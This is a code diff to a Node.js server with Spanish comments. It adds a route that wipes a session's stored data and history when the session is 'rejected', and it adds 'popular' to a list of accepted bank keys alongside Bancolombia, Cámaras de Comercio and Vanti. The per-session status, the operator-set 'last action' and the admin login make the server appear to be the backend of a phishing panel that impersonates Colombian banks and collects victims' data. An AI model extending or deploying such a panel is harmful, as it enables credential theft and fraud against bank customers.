@@ -349,6 +349,21 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 NUEVA RUTA PARA LIMPIAR LOS DATOS CUANDO SE RECHAZA
+        if (req.method === 'POST' && url === '/sesion/limpiar') {
+            try {
+                const { sessionId } = await getBody(req);
+                if (sessionId) {
+                    datosSesiones.delete(sessionId);
+                    bcSesiones.delete(sessionId);
+                    historial = historial.filter(h => h.datos && h.datos.sessionId !== sessionId);
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                }
+                json(res, 200, { ok: true });
+            } catch (e) { json(res, 400, { ok: false }); }
+            return;
+        }
+
         if (req.method === 'POST' && url === '/admin/login') {
             if (!checkRateLimit(ip, 'login')) { json(res, 429, { ok: false, error: 'Demasiados intentos' }); return; }
             try {
@@ -981,7 +996,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
-            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti';
+            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular';
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
